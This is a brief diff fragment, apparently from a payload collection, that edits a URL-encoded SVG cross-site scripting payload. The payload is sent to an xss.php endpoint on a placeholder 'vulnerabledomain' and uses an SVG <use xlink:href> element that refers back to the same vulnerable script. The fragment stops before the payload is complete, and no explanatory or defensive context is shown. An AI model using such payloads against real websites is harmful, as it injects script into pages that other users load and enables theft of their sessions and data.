@@ -1,4 +1,8 @@
-%3Csvg%20id%3D%22rectangle%22%20
+
+http://vulnerabledomain.com/xss.php?
+x=%3Csvg%3E%3Cuse%20height=200%20width=200%20
+xlink:href=%27http://vulnerabledomain.com/xss.php?
+x=%3Csvg%20id%3D%22rectangle%22%20
 xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20
 xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20
 %20%20%20width%3D%22100%22%20height%3D%22100%22%3E
